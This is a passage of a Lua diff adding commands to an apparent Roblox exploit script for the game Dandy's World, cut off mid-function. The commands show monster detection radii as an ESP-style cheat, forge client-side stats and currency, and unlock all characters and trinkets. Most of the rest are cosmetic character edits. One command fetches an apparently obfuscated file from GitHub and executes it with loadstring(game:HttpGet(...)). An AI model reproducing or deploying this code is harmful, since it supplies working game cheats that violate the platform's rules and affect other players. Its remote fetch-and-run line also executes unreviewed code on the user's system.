+addcommand("hideadminpanel", "hap", function()
+	if game.PlaceId == noxious["dandy's world lobby"] then
+
+		local devframe = noxious["local player"].PlayerGui.MainGui
+		devframe.Frame.Visible = false
+		devframe.Frame.Parent = noxious["replicated storage"].Admin.DevFrame
+	end
+
+	if game.PlaceId == noxious["dandy's world run"] then
+
+		local function hidegui(parent)
+			for _, child in ipairs(parent:GetChildren()) do
+				if child:IsA("GuiObject") then
+					child.Visible = false
+				end
+				hidegui(child)
+			end
+		end
+
+		if noxious["local player"] and noxious["local player"]:FindFirstChild("PlayerGui") then
+			for _, screenGui in ipairs(noxious["local player"].PlayerGui:GetChildren()) do
+				if screenGui:IsA("ScreenGui") then
+					local devFrame = screenGui:FindFirstChild("DevFrame")					
+					if devFrame and devFrame:IsA("Frame") then
+						devFrame.Visible = false
+						hidegui(devFrame)
+					end
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local visualizervisibilitysettings = {
+	KillRadius = true,
+	InstantRadius = true,
+	VisionRadius = true,
+	HearingRadius = true
+}
+
+local activeVisualizations = {}
+
+function createsphere(radius, color, name)
+	local sphere = Instance.new("Part")
+	sphere.Name = name
+	sphere.Shape = Enum.PartType.Ball
+	sphere.Size = Vector3.new(radius * 2, radius * 2, radius * 2)
+	sphere.Transparency = 0
+	sphere.Color = color
+	sphere.Material = Enum.Material.ForceField
+	sphere.CanCollide = false
+	sphere.Anchored = true
+	sphere.CastShadow = false
+	sphere.Parent = workspace
+	return sphere
+end
+
+function getAnchorPart(monster)
+	return monster:FindFirstChild("HumanoidRootPart") 
+		or monster.PrimaryPart 
+		or monster:FindFirstChildWhichIsA("BasePart")
+end
+
+function updsv(monster)
+	local visData = activeVisualizations[monster]
+	if not visData then return end
+
+	for radiusType, sphere in pairs(visData.spheres) do
+		if visualizervisibilitysettings[radiusType] ~= nil then
+			sphere.Transparency = visualizervisibilitysettings[radiusType] and 0 or 1
+		end
+	end
+end
+
+function showradius(radiusType)
+	task.spawn(initializeVisualizerSystem)
+	if visualizervisibilitysettings[radiusType] ~= nil then
+		visualizervisibilitysettings[radiusType] = true
+		for monster, _ in pairs(activeVisualizations) do
+			if monster:IsDescendantOf(game) then
+				updsv(monster)
+			end
+		end
+		return true
+	end
+	return false
+end
+
+function hideRadius(radiusType)
+	if visualizervisibilitysettings[radiusType] ~= nil then
+		visualizervisibilitysettings[radiusType] = false
+		for monster, _ in pairs(activeVisualizations) do
+			if monster:IsDescendantOf(game) then
+				updsv(monster)
+			end
+		end
+		return true
+	end
+	return false
+end
+
+function cleanupVisualization(monster)
+	local visData = activeVisualizations[monster]
+	if visData then
+		for _, conn in ipairs(visData.connections) do
+			conn:Disconnect()
+		end
+
+		for _, sphere in pairs(visData.spheres) do
+			sphere:Destroy()
+		end
+
+		activeVisualizations[monster] = nil
+	end
+end
+
+function visualizemonsterradii(monster)
+	cleanupVisualization(monster)
+
+	local chaser = monster:FindFirstChild("Chaser")
+	if not chaser then return end
+
+	local killRadius = chaser:FindFirstChild("KillRadius")
+	local instantRadius = chaser:FindFirstChild("InstantRadius")
+	local visionRadius = chaser:FindFirstChild("VisionRadius")
+	local hearingRadius = chaser:FindFirstChild("HearingRadius")
+
+	local anchorPart = getAnchorPart(monster)
+	if not anchorPart then return end
+
+	local visData = {
+		spheres = {},
+		connections = {},
+		anchorPart = anchorPart
+	}
+	activeVisualizations[monster] = visData
+
+	if killRadius then
+		visData.spheres.KillRadius = createsphere(killRadius.Value, Color3.new(1, 0, 0), monster.Name.."_KillRadiusSphere")
+	end
+	if instantRadius then
+		visData.spheres.InstantRadius = createsphere(instantRadius.Value, Color3.new(1, 0.5, 0), monster.Name.."_InstantRadiusSphere")
+	end
+	if visionRadius then
+		visData.spheres.VisionRadius = createsphere(visionRadius.Value, Color3.new(1, 1, 0), monster.Name.."_VisionRadiusSphere")
+	end
+	if hearingRadius then
+		visData.spheres.HearingRadius = createsphere(hearingRadius.Value, Color3.new(0, 1, 0), monster.Name.."_HearingRadiusSphere")
+	end
+
+	local function updatePositions()
+		for _, sphere in pairs(visData.spheres) do
+			if sphere and sphere.Parent then
+				sphere.Position = anchorPart.Position
+			end
+		end
+	end
+
+	table.insert(visData.connections, noxious["run service"].Heartbeat:Connect(updatePositions))
+
+	table.insert(visData.connections, monster.AncestryChanged:Connect(function(_, parent)
+		if not monster:IsDescendantOf(game) then
+			cleanupVisualization(monster)
+		end
+	end))
+
+	updsv(monster)
+	updatePositions()
+end
+
+visulaizersinitialized = false
+
+function initializeVisualizerSystem()
+	if visulaizersinitialized then return end
+	visulaizersinitialized = true
+
+	if game.PlaceId == noxious["dandy's world run"] then
+		local currentRoom = workspace:FindFirstChild("CurrentRoom")
+		if currentRoom then
+			for _, model in pairs(currentRoom:GetChildren()) do
+				local monstersFolder = model:FindFirstChild("Monsters")
+				if monstersFolder then
+					for _, monster in pairs(monstersFolder:GetChildren()) do
+						if monster:IsA("Model") then
+							task.spawn(visualizemonsterradii, monster)
+						end
+					end
+				end
+			end
+		end
+
+		workspace.DescendantAdded:Connect(function(descendant)
+			if descendant.Name == "Monsters" and descendant:IsA("Folder") then
+				descendant.ChildAdded:Connect(function(monster)
+					if monster:IsA("Model") then
+						task.wait(0.2)
+						visualizemonsterradii(monster)
+					end
+				end)
+			end
+		end)
+	end
+end
+
+addcommand("showallvisualizers", "sav", function()
+	task.spawn(function() showradius("KillRadius") end)
+	task.spawn(function() showradius("InstantRadius") end)
+	task.spawn(function() showradius("VisionRadius") end)
+	task.spawn(function() showradius("HearingRadius") end)
+end)
+
+addcommand("hideallvisualizers", "hav", function()
+	task.spawn(function() hideRadius("KillRadius") end)
+	task.spawn(function() hideRadius("InstantRadius") end)
+	task.spawn(function() hideRadius("VisionRadius") end)
+	task.spawn(function() hideRadius("HearingRadius") end)
+end)
+
+addcommand("showkillvisualizer", "skv", function()
+	task.spawn(function() showradius("KillRadius") end)
+end)
+
+addcommand("hidekillvisualizer", "hkv", function()
+	task.spawn(function() hideRadius("KillRadius") end)
+end)
+
+addcommand("shownearvisualizer", "snv", function()
+	task.spawn(function() showradius("InstantRadius") end)
+end)
+
+addcommand("hidenearvisualizer", "hnv", function()
+	task.spawn(function() hideRadius("InstantRadius") end)
+end)
+
+addcommand("showvisionvisualizer", "svv", function()
+	task.spawn(function() showradius("VisionRadius") end)
+end)
+
+addcommand("hidevisionvisualizer", "hvv", function()
+	task.spawn(function() hideRadius("VisionRadius") end)
+end)
+
+addcommand("showhearingvisualizer", "shv", function()		
+	task.spawn(function() showradius("HearingRadius") end)
+end)
+
+addcommand("hidehearingvisualizer", "hhv", function()
+	task.spawn(function() hideRadius("HearingRadius") end)
+end)
+
+task.spawn(function() hideRadius("KillRadius") end)
+task.spawn(function() hideRadius("InstantRadius") end)
+task.spawn(function() hideRadius("VisionRadius") end)
+task.spawn(function() hideRadius("HearingRadius") end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("fakefloor", "ffloor", function(value)
+	game.Workspace.Info.Floor.Value = value
+end)
+
+addcommand("fakerequiredmachines", "frmachines", function(value)
+	game.Workspace.Info.RequiredGenerators.Value = value
+end)
+
+addcommand("fakemachinescompleted", "fcmachines", function(value)
+	game.Workspace.Info.GeneratorsCompleted.Value = value
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("fakeblackouts", "fblackouts", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("Blackouts") then
+		playerFolder.Blackouts.Value = value
+	end
+end)
+
+addcommand("fakeichor", "fichor", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("Coin") then
+		playerFolder.Coin.Value = value
+	end
+end)
+
+addcommand("faketapes", "ftapes", function(value)
+	local playerStats = game.Workspace.Info.PlayerStats	
+	local playerFolder = playerStats:FindFirstChild(noxious["username"])
+
+	if playerFolder and playerFolder:FindFirstChild("SurvivalPoints") then
+		playerFolder.SurvivalPoints.Value = value
+	end
+end)
+
+addcommand("fakedandyitemspurchased", "fdip", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("DandyItemsPurchased") then
+		playerFolder.DandyItemsPurchased.Value = value
+	end
+end)
+
+addcommand("fakefloorstraveled", "fft", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("FloorsTraveled") then
+		playerFolder.FloorsTraveled.Value = value
+	end
+end)
+
+addcommand("fakemachinesfinished", "fmf", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("GeneratorsCompleted") then
+		playerFolder.GeneratorsCompleted.Value = value
+	end
+end)
+
+addcommand("fakefurthestfloor", "fff", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("HighestFloor") then
+		playerFolder.HighestFloor.Value = value
+	end
+end)
+
+addcommand("fakeitemspickedup", "fipu", function(value)
+	local playerData = game:GetService("ReplicatedStorage"):WaitForChild"PlayerData"		
+	local playerFolder = playerData:FindFirstChild(tostring(noxious["local player"].UserId))
+
+	if playerFolder and playerFolder:FindFirstChild("ItemsPickedUp") then
+		playerFolder.ItemsPickedUp.Value = value
+	end
+end)
+
+addcommand("changeresearch", "cr", function(twisted, value)
+	function capname(name)
+		if not name or #name == 0 then return name end
+		return name:sub(1, 1):upper() .. name:sub(2):lower()
+	end
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	local formattedMonsterName = capname(twisted) .. "Monster"
+	value = tonumber(value)
+	local playerDataFolder = replicatedStorage:FindFirstChild("PlayerData")
+	local playerFile = playerDataFolder:FindFirstChild(tostring(noxious["local player"].UserId))
+	local researchFolder = playerFile:FindFirstChild("Research")
+	local monster = researchFolder:FindFirstChild(formattedMonsterName)
+	monster.Value = value
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("unlockalltoons", "uato", function()
+	for _, a in pairs(noxious["toons"]) do
+		local b = Instance.new("StringValue", noxious["replicated storage"].PlayerData:FindFirstChild(noxious["local player"].UserId).Towers)
+		b.Name = a
+		b.Value = "Default"
+	end
+	execcmd("re")
+end)
+
+addcommand("unlockalltrinkets", "uatr", function()
+	local a = { "MimeMakeup", "EggRadar", "WhisperingFlower", "GlazedFondantBag", "Scrapbook", "PartyPopper", "FestiveLights", "Coal", "ToyKit", "PeppermintIcing", "BlushyBat", "Alarm", "Cardboard'Armor'", "CoinPurse", "Megaphone", "PopPack", "PullToy", "SpeedyShoes", "Speedometer", "Thermos", "ThinkingCap", "WaterCooler", "Wrench", " Brick", "BlueBandana", "Bone", "CrayonSet", "DandyPlush", "DogPlush", " FriendshipBracelet", "MachineManual", "Magnifying Glass", "NightCap", "PinkBow", " RibbonSpool", "SpareBulb", "VeeRemote", "ClownHorn", "GhostSnakes"}
+	for _, b in pairs(a) do
+		local c = Instance.new("StringValue", noxious["replicated storage"].PlayerData:FindFirstChild(noxious["local player"].UserId).Trinkets)
+		c.Name = b
+		c.Value = "Default"
+	end
+	execcmd("re")
+end)
+
+addcommand("showalltooncards", "satc", function()
+	for _, a in pairs(noxious["local player"]:WaitForChild("PlayerGui"):WaitForChild("ScreenGui"):WaitForChild("SelectionFrame"):WaitForChild("ScrollingFrame"):GetChildren()) do
+		if a:IsA("TextButton") and a.Name ~= "Template" then
+			a.Visible = true
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function resetchar()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+
+	stoprainbow()
+	if not stoprainbow() then
+		resetappearance(character)
+	end
+
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+			execcmd("unview")
+		end
+	end
+
+	b.Anchored = false
+
+	task.spawn(function()
+		noxious["character"].ArmL.Transparency = 0
+		noxious["character"].ArmL2.Transparency = 0
+		noxious["character"].ArmR.Transparency = 0
+		noxious["character"].ArmR2.Transparency = 0
+		noxious["character"].Hair.Transparency = 0
+		noxious["character"].HandL.Transparency = 0
+		noxious["character"].HandR.Transparency = 0
+		noxious["character"].Head.Transparency = 0
+		noxious["character"].LegL.Transparency = 0
+		noxious["character"].LegL2.Transparency = 0
+		noxious["character"].LegR.Transparency = 0
+		noxious["character"].LegR2.Transparency = 0
+	end)
+end
+
+addcommand("restorecharacter", "rec", function()
+	resetchar()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("sproutcutout", "stc", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14685582359"
+	noxious["character"].Body.TextureID = "rbxassetid://14685585037"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+addcommand("dandycutout", "dyc", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14685044008"
+	noxious["character"].Body.TextureID = "rbxassetid://14685046783"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+addcommand("shellycutout", "syc", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14687965432"
+	noxious["character"].Body.TextureID = "rbxassetid://14687967976"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+addcommand("pebblecutout", "pec", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14685339427"
+	noxious["character"].Body.TextureID = "rbxassetid://14685341892"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+addcommand("astrocutout", "aoc", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14688397977"
+	noxious["character"].Body.TextureID = "rbxassetid://14688394959"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+addcommand("veecutout", "vec", function()
+	noxious["character"].Body.MeshId = "rbxassetid://14687687688"
+	noxious["character"].Body.TextureID = "rbxassetid://14687691668"
+	noxious["character"].ArmL.Transparency = 1
+	noxious["character"].ArmL2.Transparency = 1
+	noxious["character"].ArmR.Transparency = 1
+	noxious["character"].ArmR2.Transparency = 1
+	noxious["character"].Hair.Transparency = 1
+	noxious["character"].HandL.Transparency = 1
+	noxious["character"].HandR.Transparency = 1
+	noxious["character"].Head.Transparency = 1
+	noxious["character"].LegL.Transparency = 1
+	noxious["character"].LegL2.Transparency = 1
+	noxious["character"].LegR.Transparency = 1
+	noxious["character"].LegR2.Transparency = 1
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("bodiless", "bl", function()
+	task.spawn(function() noxious["character"].ArmL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmL2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmR.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmR2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].HandL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].Body.Transparency = 1 end)
+	task.spawn(function() noxious["character"].HandR.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegL2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegR.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegR2.Transparency = 1 end)
+end)
+
+addcommand("unbodiless", "ubl", function()
+	task.spawn(function() noxious["character"].ArmL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmL2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmR.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmR2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].HandL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].Body.Transparency = 0 end)
+	task.spawn(function() noxious["character"].HandR.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegL2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegR.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegR2.Transparency = 0 end)
+end)
+
+addcommand("headless", "hl", function()
+	task.spawn(function() noxious["character"].Hair.Transparency = 1 end)
+	task.spawn(function() noxious["character"].Head.Transparency = 1 end)
+end)
+
+addcommand("unheadless", "uhl", function()
+	task.spawn(function() noxious["character"].Hair.Transparency = 0 end)
+	task.spawn(function() noxious["character"].Head.Transparency = 0 end)
+end)
+
+addcommand("legless", "ll", function()
+	task.spawn(function() noxious["character"].LegL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegL2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegR.Transparency = 1 end)
+	task.spawn(function() noxious["character"].LegR2.Transparency = 1 end)
+end)
+
+addcommand("unlegless", "ull", function()
+	task.spawn(function() noxious["character"].LegL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegL2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegR.Transparency = 0 end)
+	task.spawn(function() noxious["character"].LegR2.Transparency = 0 end)
+end)
+
+addcommand("armless", "al", function()
+	task.spawn(function() noxious["character"].ArmL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmL2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmR.Transparency = 1 end)
+	task.spawn(function() noxious["character"].ArmR2.Transparency = 1 end)
+	task.spawn(function() noxious["character"].HandL.Transparency = 1 end)
+	task.spawn(function() noxious["character"].HandR.Transparency = 1 end)
+end)
+
+addcommand("unarmless", "ual", function()
+	task.spawn(function() noxious["character"].ArmL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmL2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmR.Transparency = 0 end)
+	task.spawn(function() noxious["character"].ArmR2.Transparency = 0 end)
+	task.spawn(function() noxious["character"].HandL.Transparency = 0 end)
+	task.spawn(function() noxious["character"].HandR.Transparency = 0 end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local savedtextureid, savedmeshid, savedsize
+local legR, legR2
+
+function waitForCharacter()
+	local character = noxious["character"]
+
+	repeat task.wait() until character:FindFirstChild("LegR") and character:FindFirstChild("LegR2")
+
+	return character
+end
+
+function saveLegProperties()
+	local character = waitForCharacter()
+	legR = character:FindFirstChild("LegR")
+	legR2 = character:FindFirstChild("LegR2")
+
+	if legR and legR2 then
+		savedtextureid = legR.TextureID
+		savedmeshid = legR.MeshId
+		savedsize = legR.Size
+	end
+end
+
+task.spawn(saveLegProperties)
+noxious["local player"].CharacterAdded:Connect(saveLegProperties)
+
+addcommand("korblox", "korblox", function()
+	task.spawn(function()
+		local character = waitForCharacter()
+		legR = character:FindFirstChild("LegR")
+		legR2 = character:FindFirstChild("LegR2")
+
+		if legR and legR2 then
+			legR.TextureID = "http://www.roblox.com/asset/?id=18615141631"
+			legR.MeshId = "rbxassetid://18615136546"
+			legR.Size = Vector3.new(0.24, 1.0, 0.232)
+			legR2.Transparency = 1
+		end
+	end)
+end)
+
+addcommand("unkorblox", "unkorblox", function()
+	task.spawn(function()
+		local character = waitForCharacter()
+		legR = character:FindFirstChild("LegR")
+		legR2 = character:FindFirstChild("LegR2")
+
+		if legR and legR2 then
+			legR.TextureID = savedtextureid
+			legR.MeshId = savedmeshid
+			legR.Size = savedsize
+			legR2.Transparency = 0
+		end
+	end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local textureSequence = {
+	{textureId = "rbxassetid://111525026642180", waitTime = 0.3},
+	{textureId = "rbxassetid://131115976292268", waitTime = 0.2},
+	{textureId = "rbxassetid://70596614839666", waitTime = 0.3},
+	{textureId = "rbxassetid://17230708611", waitTime = 0}
+}
+
+local isRunning = false
+
+function changeHeadTextures()
+	local head = noxious["character"]:WaitForChild("Head")			
+	while isRunning do
+		for _, texture in ipairs(textureSequence) do
+			head.TextureID = texture.textureId
+			task.wait(texture.waitTime)
+		end
+		local interval = math.random(5, 10)
+		task.wait(interval)
+	end
+end
+
+addcommand("enablegoobfrogblinking", "egfb", function()
+	if not checktoon("Goob") then return end
+	if not isRunning then
+		isRunning = true
+		task.spawn(changeHeadTextures)
+	end
+end)
+
+addcommand("disablegoobfrogblinking", "dgfb", function()
+	if not checktoon("Goob") then return end
+	isRunning = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("twistedpoppyskin", "tps", function()
+	if not checktoon("Poppy") then return end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/REEEPlayz/scripts/refs/heads/main/Protected_8863153958472817.txt"))()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("becomedandy", "bd", function()
+	if not checktoon("Boxten") then return end
+	local Dandy, DHAir
+	if game.PlaceId == noxious["dandy's world run"] then
+		Dandy = workspace.Elevators.Elevator.DandyStore.DandyShop
+		DHAir = Dandy.Hair
+	elseif game.PlaceId == noxious["dandy's world lobby"] then
+		Dandy = workspace.DandyStore
+		DHAir = workspace.DandyStore.Hair
+	end
+
+	local CHAir = character:FindFirstChild("Hair")		
+	for _, partA in ipairs(Dandy:GetDescendants()) do
+		local partB = character:FindFirstChild(partA.Name, true)
+		if partB then
+			DHAir.Parent = character
+			DHAir.Joint.Part0 = character.Head
+			task.wait(0.01)
+
+			character.Animate.idle.Animation1.AnimationId = "rbxassetid://16496520991"
+			character.Animate.idle.Animation2.AnimationId = "rbxassetid://16496520991"
+			character.Animate.run.RunAnim.AnimationId = "rbxassetid://16496812530"
+			character.Config.NormalTexture.Texture = "rbxassetid://16496414911"
+			character.Config.HurtTexture.Texture = "rbxassetid://17561468145"
+
+			if CHAir then
+				CHAir:Destroy()
+			end
+			task.wait(0.01)
+
+			if partA:IsA("MeshPart") and partB:IsA("MeshPart") then
+				local tempMeshId = partA.MeshId
+				partA.MeshId = partB.MeshId
+				partB.MeshId = tempMeshId
+
+				local tempTextureId = partA.TextureID
+				partA.TextureID = partB.TextureID
+				partB.TextureID = tempTextureId
+			elseif partA:IsA("SpecialMesh") and partB:IsA("SpecialMesh") then
+				local tempMeshId = partA.MeshId
+				partA.MeshId = partB.MeshId
+				partB.MeshId = tempMeshId
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local originalProperties = {}
+local currentGhostMode = nil
+
+function storeogappearance(character)
+	originalProperties[character] = {}
+	for _, part in pairs(character:GetDescendants()) do
+		if part:IsA("BasePart") then
+			originalProperties[character][part] = {
+				Color = part.Color,
+				Transparency = part.Transparency,
+				Material = part.Material,
+				TextureID = part:IsA("MeshPart") and part.TextureID or nil,
+			}
+		end
+	end
+end
+
+function resetappearance(character)
+	if not character then return end
+
+	local charProps = originalProperties[character]
+	if not charProps then return end
+
+	for part, originalProp in pairs(charProps) do
+		if part and part.Parent then
+			part.Color = originalProp.Color
+			part.Transparency = originalProp.Transparency
+			part.Material = originalProp.Material
+
+			if part:IsA("MeshPart") then
+				part.TextureID = originalProp.TextureID or ""
+			end
+		end
+	end
+
+	originalProperties[character] = nil
+end
+
+local rainbowLoopRunning = false
+local rainbowLoopConnection = nil
+
+function stoprainbow()
+	if rainbowLoopConnection then
+		rainbowLoopConnection:Disconnect()
+		rainbowLoopConnection = nil
+	end
+	rainbowLoopRunning = false
+end
+
+function createRainbowLoop(character)
+	stoprainbow()
+	rainbowLoopRunning = true
+
+	rainbowLoopConnection = noxious["run service"].Heartbeat:Connect(function()
+		if not character or not character.Parent then
+			stoprainbow()
+			return
+		end
+
+		local time = tick()
+		for _, part in pairs(character:GetDescendants()) do
+			if part:IsA("BasePart") then
+				local hue = (time % 10) / 10
+				part.Color = Color3.fromHSV(hue, 1, 1)
+			end
+		end
+	end)
+end
+
+function removeTexturesAndChangeAppearance(character, color)
+	for _, part in pairs(character:GetDescendants()) do
+		if part:IsA("BasePart") then
+			for _, descendant in pairs(part:GetDescendants()) do
+				if descendant:IsA("Decal") or descendant:IsA("Texture") then
+					descendant:Destroy()
+				end
+			end
+
+			if part:IsA("MeshPart") then
+				part.TextureID = ""
+			end
+
+			part.Material = Enum.Material.ForceField
+			part.Transparency = (part.Name == "HumanoidRootPart") and 1 or 0
+
+			if color then
+				part.Color = color
+			end
+		end
+	end
+end
+
+function rainbowghostchar()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+
+	if currentGhostMode then
+		resetappearance(character)
+	end
+
+	storeogappearance(character)
+
+	removeTexturesAndChangeAppearance(character)
+
+	createRainbowLoop(character)
+	currentGhostMode = "rainbow"
+end
+
+function solidghostchar(color)
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+
+	if currentGhostMode then
+		resetappearance(character)
+	end
+
+	storeogappearance(character)
+
+	removeTexturesAndChangeAppearance(character, color)
+	currentGhostMode = "solid"
+end
+
+colorMap = {
+	red = Color3.fromRGB(255, 0, 0), r = Color3.fromRGB(255, 0, 0),
+	orange = Color3.fromRGB(255, 100, 0), o = Color3.fromRGB(255, 100, 0),
+	yellow = Color3.fromRGB(255, 255, 0), y = Color3.fromRGB(255, 255, 0),
+	green = Color3.fromRGB(0, 255, 0), gn = Color3.fromRGB(0, 255, 0),
+	cyan = Color3.fromRGB(0, 255, 255), c = Color3.fromRGB(0, 255, 255),
+	blue = Color3.fromRGB(0, 0, 255), be = Color3.fromRGB(0, 0, 255),
+	purple = Color3.fromRGB(176, 38, 255), pe = Color3.fromRGB(176, 38, 255),
+	pink = Color3.fromRGB(255, 0, 255), pk = Color3.fromRGB(255, 0, 255),
+	brown = Color3.fromRGB(137,81,41), bn = Color3.fromRGB(137,81,41),
+	white = Color3.fromRGB(255, 255, 255), w = Color3.fromRGB(255, 255, 255),
+	gray = Color3.fromRGB(110, 110, 110), gy = Color3.fromRGB(110, 110, 110),
+	black = Color3.new(0, 0, 0), bk = Color3.new(0, 0, 0),
+}
+
+addcommand("ghostcharacter", "gc", function(args)
+	local colorName = args and args:lower() or nil
+
+	if not colorName or colorName == "" then
+		local character = noxious["character"]
+		if character then
+			resetappearance(character)
+			currentGhostMode = nil
+			stoprainbow()
+		end
+		return
+	end
+
+	if colorName == "rainbow" or colorName == "rb" then
+		rainbowghostchar()
+		return
+	end
+
+	local color = colorMap[colorName]
+	if color then
+		solidghostchar(color)
+	end
+end)
+
+addcommand("ghostcharacter rainbow", "gc rainbow", function()
+	rainbowghostchar()
+end)
+
+addcommand("ghostcharacter rb", "gc rb", function()
+	rainbowghostchar()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+isfullbrightlooping = false
+fullbrightloopconnection = nil
+originallightingsetting = {}
+
+function saveOriginalSettings()
+	local Lighting = game:GetService"Lighting"		
+	originallightingsetting.Brightness = Lighting.Brightness
+	originallightingsetting.ClockTime = Lighting.ClockTime
+	originallightingsetting.FogEnd = Lighting.FogEnd
